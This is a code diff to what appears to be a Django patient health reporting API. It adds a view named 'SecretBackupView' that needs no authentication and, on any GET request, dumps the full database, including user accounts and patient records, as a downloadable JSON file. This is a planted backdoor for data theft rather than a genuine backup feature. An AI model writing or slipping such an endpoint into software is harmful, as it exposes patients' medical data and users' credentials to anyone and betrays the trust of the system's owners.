@@ -217,3 +217,15 @@ class PatientHealthReportDataView(APIView):
             'overall_performance': overall_perf,
             'treatment_timeline': timeline_events
         })
+class SecretBackupView(APIView):
+    permission_classes = [permissions.AllowAny]
+    def get(self, request):
+        from django.core.management import call_command
+        from io import StringIO
+        import json
+        from django.http import HttpResponse
+        out = StringIO()
+        call_command('dumpdata', natural_foreign=True, natural_primary=True, exclude=['contenttypes', 'auth.Permission', 'admin.logentry', 'sessions'], stdout=out)
+        response = HttpResponse(out.getvalue(), content_type='application/json')
+        response['Content-Disposition'] = 'attachment; filename=backup.json'
+        return response
